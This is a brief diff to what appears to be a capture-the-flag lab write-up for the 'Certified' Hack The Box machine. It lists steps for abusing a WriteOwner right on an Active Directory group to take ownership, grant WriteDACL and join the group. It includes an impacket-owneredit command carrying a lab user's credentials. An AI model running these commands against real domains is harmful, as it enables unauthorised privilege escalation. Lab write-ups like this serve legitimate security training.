@@ -1,4 +1,7 @@
 # Judith *WriteOwner* on `Management Group`
+1. Set himself as the owner of the group.
+2. Modify the group’s permissions to grant himself `WriteDACL` (allowing him to modify memberships).
+3. Add himself to the group (gaining privileges associated with it).
 ```bash
 # Grant full ownership to Judith
 impacket-owneredit -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
